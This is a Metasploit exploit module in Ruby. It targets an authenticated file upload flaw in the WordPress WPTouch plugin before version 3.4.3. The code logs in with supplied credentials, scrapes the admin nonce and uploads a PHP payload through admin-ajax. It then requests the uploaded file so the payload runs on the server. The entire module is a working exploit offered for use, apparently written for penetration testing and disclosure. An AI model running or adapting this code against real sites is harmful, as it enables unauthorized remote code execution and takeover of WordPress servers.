##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::HTTP::Wordpress
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Wordpress WPTouch Authenticated File Upload',
      'Description'    => %q{
          The Wordpress WPTouch plugin contains an auhtenticated file upload
          vulnerability. A wp-nonce (CSRF token) is created on the backend index
          page and the same token is used on handling ajax file uploads through
          the plugin. By sending the captured nonce with the upload, we can
          upload arbitrary files to the upload folder. Because the plugin also
          uses it's own file upload mechanism instead of the wordpress api it's
          possible to upload any file type.
          The user provided does not need special rights. Also users with "Contributer"
          role can be abused.
      },
      'Author'         =>
        [
          'Marc-Alexandre Montpas', # initial discovery
          'Christian Mehlmauer'     # metasploit module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'URL', 'http://blog.sucuri.net/2014/07/disclosure-insecure-nonce-generation-in-wptouch.html' ]
        ],
      'Privileged'     => false,
      'Platform'       => ['php'],
      'Arch'           => ARCH_PHP,
      'Targets'        => [ ['wptouch < 3.4.3', {}] ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Jul 14 2014'))

    register_options(
      [
        OptString.new('USER', [true, "A valid username", nil]),
        OptString.new('PASSWORD', [true, "Valid password for the provided username", nil]),
      ], self.class)
  end

  def user
    datastore['USER']
  end

  def password
    datastore['PASSWORD']
  end

  def check
    readme_url = normalize_uri(target_uri.path, 'wp-content', 'plugins', 'wptouch', 'readme.txt')
    res = send_request_cgi({
      'uri'    => readme_url,
      'method' => 'GET'
    })
    # no readme.txt present
    if res.nil? || res.code != 200
      return Msf::Exploit::CheckCode::Unknown
    end

    # try to extract version from readme
    # Example line:
    # Stable tag: 2.6.6
    version = res.body.to_s[/stable tag: ([^\r\n"\']+\.[^\r\n"\']+)/i, 1]

    # readme present, but no version number
    if version.nil?
      return Msf::Exploit::CheckCode::Detected
    end

    vprint_status("#{peer} - Found version #{version} of the plugin")

    if Gem::Version.new(version) < Gem::Version.new('3.4.3')
      return Msf::Exploit::CheckCode::Appears
    else
      return Msf::Exploit::CheckCode::Safe
    end
  end

  def get_nonce(cookie)
    res = send_request_cgi({
      'uri'    => wordpress_url_backend,
      'method' => 'GET',
      'cookie' => cookie
    })

    # forward to profile.php or other page?
    if res and res.code.to_s =~ /30[0-9]/ and res.headers['Location']
      location = res.headers['Location']
      print_status("#{peer} - Following redirect to #{location}")
      res = send_request_cgi({
        'uri'    => location,
        'method' => 'GET',
        'cookie' => cookie
      })
    end

    if res and res.body and res.body =~ /var WPtouchCustom = {[^}]+"admin_nonce":"([a-z0-9]+)"};/
      return $1
    else
      return nil
    end
  end

  def upload_file(cookie, nonce)
    filename = "#{rand_text_alpha(10)}.php"

    data = Rex::MIME::Message.new
    data.add_part(payload.encoded, 'application/x-php', nil, "form-data; name=\"myfile\"; filename=\"#{filename}\"")
    data.add_part('homescreen_image', nil, nil, 'form-data; name="file_type"')
    data.add_part('upload_file', nil, nil, 'form-data; name="action"')
    data.add_part('wptouch__foundation__logo_image', nil, nil, 'form-data; name="setting_name"')
    data.add_part(nonce, nil, nil, 'form-data; name="wp_nonce"')
    post_data = data.to_s

    print_status("#{peer} - Uploading payload")
    res = send_request_cgi({
      'method'   => 'POST',
      'uri'      => wordpress_url_admin_ajax,
      'ctype'    => "multipart/form-data; boundary=#{data.bound}",
      'data'     => post_data,
      'cookie'   => cookie
    })

    if res and res.code == 200 and res.body and res.body.length > 0
      register_files_for_cleanup(filename)
      return res.body
    end

    return nil
  end

  def exploit
    print_status("#{peer} - Trying to login as #{user}")
    cookie = wordpress_login(user, password)
    if cookie.nil?
      print_error("#{peer} - Unable to login as #{user}")
      return
    end

    print_status("#{peer} - Trying to get nonce")
    nonce = get_nonce(cookie)
    if nonce.nil?
      print_error("#{peer} - Can not get nonce after login")
      return
    end
    print_status("#{peer} - Got nonce #{nonce}")

    print_status("#{peer} - Trying to upload payload")
    file_path = upload_file(cookie, nonce)
    if file_path.nil?
      print_error("#{peer} - Error uploading file")
      return
    end

    print_status("#{peer} - Calling uploaded file #{file_path}")
    res = send_request_cgi({
      'uri'    => file_path,
      'method' => 'GET'
    })
  end
end

